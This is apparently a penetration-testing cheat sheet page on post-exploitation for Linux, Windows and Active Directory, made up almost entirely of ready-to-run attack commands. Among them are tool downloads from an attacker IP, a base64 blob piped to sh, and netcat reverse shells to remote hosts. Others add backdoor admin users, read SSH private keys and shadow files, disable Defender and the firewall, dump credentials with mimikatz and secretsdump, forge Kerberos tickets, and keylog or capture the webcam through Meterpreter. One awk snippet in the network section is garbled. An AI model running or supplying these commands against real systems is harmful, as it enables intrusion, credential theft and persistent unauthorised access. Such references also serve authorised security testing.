---
description: 'Privesc, lateral movements, looting...'
---

# Post-exploitation

* [Linux](post.md#linux)
* [Windows](post.md#windows)
* [Looting](post.md#looting)

## Linux

```text
**Tools** 
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh
https://github.com/mbahadou/postenum/blob/master/postenum.sh
https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32
https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64)

https://gtfobins.github.io/

# Spawning shell
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec "/bin/sh";'
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
(From within vi)
:!bash
:set shell=/bin/bash:shell
(From within nmap)
!sh

# Access to more binaries
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Download files from attacker
wget http://10.11.1.111:8080/ -r; mv 10.11.1.111:8080 exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linpeas.sh postenum.sh pspy32 pspy64

# Enum scripts
./LinEnum.sh -t -k password -r LinEnum.txt
./postenum.sh
./linpeas.sh
./pspy

# Common writable directories
/tmp
/var/tmp
/dev/shm

# Add user to sudoers
useradd hacker
passwd hacker
echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers

# sudo permissions
sudo -l -l

# Journalctl
If you can run as root, run in small window and !/bin/sh

# Crons
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
cat /etc/frontal
cat /etc/anacron
systemctl list-timers --all

# Common info
uname -a
env
id
cat /proc/version
cat /etc/issue
cat /etc/passwd
cat /etc/group
cat /etc/shadow
cat /etc/hosts

# Users with login
grep -vE "nologin" /etc/passwd

# Network info
cat /proc/net/arp
cat /proc/net/fib_trie
cat /proc/net/fib_trie | grep "|--"   | egrep -v "0.0.0.0| 127."
awk '/32 host/ { print f } {f=$2}' <<< "$(0; i-=2) {
        ret = ret"."hextodec(substr(str,i,2))
    }
    ret = ret":"hextodec(substr(str,index(str,":")+1,4))
    return ret
} 
NR > 1 {{if(NR==2)print "Local - Remote";local=getIP($2);remote=getIP($3)}{print local" - "remote}}' /proc/net/tcp

# Netstat without netstat 2
echo "YXdrICdmdW5jdGlvbiBoZXh0b2RlYyhzdHIscmV0LG4saSxrLGMpewogICAgcmV0ID0gMAogICAgbiA9IGxlbmd0aChzdHIpCiAgICBmb3IgKGkgPSAxOyBpIDw9IG47IGkrKykgewogICAgICAgIGMgPSB0b2xvd2VyKHN1YnN0cihzdHIsIGksIDEpKQogICAgICAgIGsgPSBpbmRleCgiMTIzNDU2Nzg5YWJjZGVmIiwgYykKICAgICAgICByZXQgPSByZXQgKiAxNiArIGsKICAgIH0KICAgIHJldHVybiByZXQKfQpmdW5jdGlvbiBnZXRJUChzdHIscmV0KXsKICAgIHJldD1oZXh0b2RlYyhzdWJzdHIoc3RyLGluZGV4KHN0ciwiOiIpLTIsMikpOyAKICAgIGZvciAoaT01OyBpPjA7IGktPTIpIHsKICAgICAgICByZXQgPSByZXQiLiJoZXh0b2RlYyhzdWJzdHIoc3RyLGksMikpCiAgICB9CiAgICByZXQgPSByZXQiOiJoZXh0b2RlYyhzdWJzdHIoc3RyLGluZGV4KHN0ciwiOiIpKzEsNCkpCiAgICByZXR1cm4gcmV0Cn0gCk5SID4gMSB7e2lmKE5SPT0yKXByaW50ICJMb2NhbCAtIFJlbW90ZSI7bG9jYWw9Z2V0SVAoJDIpO3JlbW90ZT1nZXRJUCgkMyl9e3ByaW50IGxvY2FsIiAtICJyZW1vdGV9fScgL3Byb2MvbmV0L3RjcCAKqtc" | base64 -d | sh

# Nmap without nmap
for ip in {1..5}; do for port in {21,22,5000,8000,3306}; do (echo >/dev/tcp/172.18.0.$ip/$port) >& /dev/null && echo "172.18.0.$ip port $port is open"; done; done

# Open ports without netstat
grep -v "rem_address" /proc/net/tcp | awk  '{x=strtonum("0x"substr($2,index($2,":")-2,2)); for (i=5; i>0; i-=2) x = x"."strtonum("0x"substr($2,i,2))}{print x":"strtonum("0x"substr($2,index($2,":")+1,4))}'

# Check ssh files:
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key

# SUID
find / -perm -4000 -type f 2>/dev/null
# ALL PERMS
find / -perm -777 -type f 2>/dev/null
# SUID for current user
find / perm /u=s -user `whoami` 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
# Writables for current user/group
find / perm /u=w -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null
find / -perm /u+w -user `whoami` 2>/dev/nul
# Dirs with +w perms for current u/g
find / perm /u=w -type -d -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -d -user `whoami` 2>/dev/null

# Port Forwarding
# Chisel
# Victim server:
chisel server --auth "test:123" -p 443 --reverse
# In host attacker machine:
./chisel client --auth "test:123" 10.10.10.10:443 R:socks

# Dynamic Port Forwarding:
# Attacker machine:
ssh -D 9050 user@host
# Attacker machine Burp Proxy - SOCKS Proxy:
Mark “Override User Options”
Mark Use Socks Proxy:
SOCKS host:127.0.0.1
SOCKS port:9050

# Tunneling 
Target must have SSH running for there service
1. Create SSH Tunnel: ssh -D localhost: -f -N user@localhost -p 
2. Setup ProxyChains. Edit the following config file (/etc/proxychains.conf)
3. Add the following line into the config: Socks5 127.0.0.1 
4. Run commands through the tunnel: proxychains 

# SShuttle
# https://github.com/sshuttle/sshuttle
sshuttle -r root@172.21.0.0 10.2.2.0/24

# netsh port forwarding
netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=9000 connectaddress=192.168.0.10 connectport=80
netsh interface portproxy delete v4tov4 listenaddress=127.0.0.1 listenport=9000
```

## Windows

```text
**Tools** 
https://github.com/S3cur3Th1sSh1t/WinPwn
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat
https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/privesc/PowerUp.ps1
https://github.com/S3cur3Th1sSh1t/PowerSharpPack 

https://lolbas-project.github.io/#

# Basic info
systeminfo
set
hostname
net users
net user user1
net localgroups
accesschk.exe -uwcqv "Authenticated Users" *
netsh firewall show state
netsh firewall show config
whoami /priv

# Set path
set PATH=%PATH%;C:\xampp\php

dir /a -> Show hidden & unhidden files
dir /Q -> Show permissions

# check .net version:
gci 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -recurse | gp -name Version -EA 0 | where { $_.PSChildName -match '^(?!S)\p{L}'} | select PSChildName, Version
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "Users Path"

# Passwords
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"
# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
python secretsdump.py -just-dc-ntlm htb.hostname/username@10.10.1.10 
secretsdump.py -just-dc htb.hostname/username@10.10.1.10 > dump.txt

# Add RDP user and disable firewall
net user haxxor Haxxor123 /add
net localgroup Administrators haxxor /add
net localgroup "Remote Desktop Users" haxxor /ADD
# Turn firewall off and enable RDP
sc stop WinDefend
netsh advfirewall show allprofiles
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

# Dump Firefox data
# Looking for Firefox
Get-Process
./procdump64.exe -ma $PID-FF
Select-String -Path .\*.dmp -Pattern 'password' > 1.txt
type 1.txt | findstr /s /i "admin"

# PS Bypass Policy 
Set-ExecutionPolicy Unrestricted
powershell.exe -exec bypass
Set-ExecutionPolicy-ExecutionPolicyBypass -Scope Procesy

# Convert passwords to secure strings and output to an XML file:
$secpasswd = ConvertTo-SecureString "VMware1!" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("administrator", $secpasswd) 
$mycreds | export-clixml -path c:\temp\password.xml

# PS sudo
$pw= convertto-securestring "EnterPasswordHere" -asplaintext -force
$pp = new-object -typename System.Management.Automation.PSCredential -argumentlist "EnterDomainName\EnterUserName",$pw
$script = "C:\Users\EnterUserName\AppData\Local\Temp\test.bat"
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process $script -verb Runas}'
powershell -ExecutionPolicy -F -File xyz.ps1

# PS runas
# START PROCESS
$username='someUser'
$password='somePassword'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process .\nc.exe -ArgumentList '10.10.xx.xx 4445 -e cmd.exe' -Credential $credential
# INVOKE COMMAND
$pass = ConvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force; $Credential = New-Object System.Management.Automation.PSCredential ("fidelity\hector", $pass);Invoke-Command -Computer 'Fidelity' -ScriptBlock {C:\inetpub\wwwroot\uploads\nc.exe -e cmd 10.10.15.121 443} -credential $Credential

# Tasks
schtasks /query /fo LIST /v
file c:\WINDOWS\SchedLgU.Txt
python3 atexec.py Domain/Administrator:<Password>@123@172.21.0.0 systeminfo

# Useradd bin
#include  /* system, NULL, EXIT_FAILURE */
int main ()
{
  int i;
  i=system ("net user   /add && net localgroup administrators  /add");
  return 0;
}
# Compile
i686-w64-mingw32-gcc -o useradd.exe useradd.c

# WinXP
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.1.111 4343 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
sc config upnphost depend= ""
net start upnphost

# WinRM Port Forwarding
plink -l LOCALUSER -pw LOCALPASSWORD LOCALIP -R 5985:127.0.0.1:5985 -P 221

# DLL Injection
#include 
int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
# x64 compilation:
x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

# NTLM Relay Attack
We need two tools to perform the attack, privexchange.py and ntlmrelayx. You can get both on GitHub in the PrivExchange and impacket  repositories. Start ntlmrelayx in relay mode with LDAP on a Domain Controller as  target, and supply a user under the attackers control to escalate  privileges with (in this case the ntu user):

ntlmrelayx.py -t ldap://s2016dc.testsegment.local --escalate-user ntu

Now we run the privexchange.py script:

user@localhost:~/exchpoc$ python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u ntu -d testsegment.local

Password: 
INFO: Using attacker URL: http://dev.testsegment.local/privexchange/
INFO: Exchange returned HTTP status 200 - authentication was OK
ERROR: The user you authenticated with does not have a mailbox associated. Try a different user.
When this is run with a user which doesn’t have a mailbox, we will get the above error. Let’s try it again with a user which does have a mailbox associated:

user@localhost:~/exchpoc$ python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u testuser -d testsegment.local 
Password: 
INFO: Using attacker URL: http://dev.testsegment.local/privexchange/
INFO: Exchange returned HTTP status 200 - authentication was OK
INFO: API call was successful

After a minute (which is the value supplied for the push  notification) we see the connection coming in at ntlmrelayx, which gives  our user DCSync privileges:
 We confirm the DCSync rights are in place with secretsdump: 
With all the hashed password of all Active Directory users, the  attacker can create golden tickets to impersonate any user, or use any  users password hash to authenticate to any service accepting NTLM or  Kerberos authentication in the domain.

# Generate Silver Tickets with Impacket:
python3 ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
python3 ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

# Generate Golden Tickets:
python3 ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
python3 ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

# Credential Access with Secretsdump
impacket-secretsdump username@target-ip -dc-ip target-ip


https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/?view=powershell-6
https://powersploit.readthedocs.io/en/latest/
https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/
https://techcommunity.microsoft.com/t5/itops-talk-blog/powershell-basics-how-to-scan-open-ports-within-a-network/ba-p/924149
https://pen-testing.sans.org/blog/2017/03/08/pen-test-poster-white-board-powershell-built-in-port-scanner/
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1
https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/
```

### AD

```text
# Anonymous Credential LDAP Dumping:
ldapsearch -LLL -x -H ldap:// -b ‘’ -s base ‘(objectclass=*)’

# Impacket GetADUsers.py (Must have valid credentials)
GetADUsers.py -all  -dc-ip 

# Impacket lookupsid.py
/usr/share/doc/python3-impacket/examples/lookupsid.py username:password@172.21.0.0

# Windapsearch:
# https://github.com/ropnop/windapsearch 
python3 windapsearch.py -d host.domain -u domain\\ldapbind -p PASSWORD -U

# CME
cme smb IP -u '' -p '' --users --shares

#  References: 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#most-common-paths-to-ad-compromise
https://github.com/infosecn1nja/AD-Attack-Defense
https://adsecurity.org/?page_id=1821 
https://github.com/sense-of-security/ADRecon
https://adsecurity.org/?p=15
https://adsecurity.org/?cat=7
https://adsecurity.org/?page_id=4031
https://www.fuzzysecurity.com/tutorials/16.html
https://blog.stealthbits.com/complete-domain-compromise-with-golden-tickets/
http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/
https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain
https://adsecurity.org/?p=1588
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://www.harmj0y.net/blog/tag/powerview/
https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos

# BloodHound
# https://github.com/BloodHoundAD/BloodHound/releases
# https://github.com/BloodHoundAD/SharpHound3
# https://github.com/chryzsh/DarthSidious/blob/master/enumeration/bloodhound.md
Import-Module .\sharphound.ps1
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound -CollectionMethod All -domain target-domain -LDAPUser username -LDAPPass password

# Rubeus
# https://github.com/GhostPack/Rubeus
## ASREProasting:
Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>
## Kerberoasting:
Rubeus.exe kerberoast /outfile:<output_TGSs_file>
Rubeus.exe kerberoast /outfile:hashes.txt [/spn:"SID-VALUE"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] 
## Pass the key (PTK):
.\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt
# Using the ticket on a Windows target: 
Rubeus.exe ptt /ticket:<ticket_kirbi_file>
```

## Looting

### Linux

```text
# Linux
cat /etc/passwd
cat /etc/shadow
unshadow passwd shadow > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

ifconfig
ifconfig -a
arp -a

tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not 10.11.1.111 and dst not 10.11.1.111
tcpdump -vv -i eth0 src not 10.11.1.111 and dst not 10.11.1.111

.bash_history

/var/mail
/var/spool/mail

echo $DESKTOP_SESSION
echo $XDG_CURRENT_DESKTOP
echo $GDMSESSION
```

### Windows

```text
hostname && whoami.exe && type proof.txt && ipconfig /all
wce32.exe -w
wce64.exe -w
fgdump.exe

# Loot passwords without tools
reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system

ipconfig /all
route print

# What other machines have been connected
arp -a

# Meterpreter
run packetrecorder -li
run packetrecorder -i 1

#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql
hashdump
keysscan_start
keyscan_dump
keyscan_stop
webcam_snap
load mimikatz
msv

# How to cat files in meterpreter
cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt

# Recursive search
dir /s

secretsdump.py -just-dc htb.hostname/username@10.10.1.10 > dump.txt
.\mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"

# Mimikatz
# Post exploitation commands must be executed from SYSTEM level privileges.
mimikatz # privilege::debug
mimikatz # token::whoami
mimikatz # token::elevate
mimikatz # lsadump::sam
mimikatz # sekurlsa::logonpasswords
## Pass The Hash
mimikatz # sekurlsa::pth /user:username /domain:domain.tld /ntlm:ntlm_hash
# Inject generated TGS key
mimikatz # kerberos::ptt <ticket_kirbi_file>
# Generating a silver ticket 
# AES 256 Key:
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
# AES 128 Key:
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
# NTLM
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
# Generating a Golden Ticket
# AES 256 Key:
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>
# AES 128 Key: 
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>
# NTLM:
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>
```

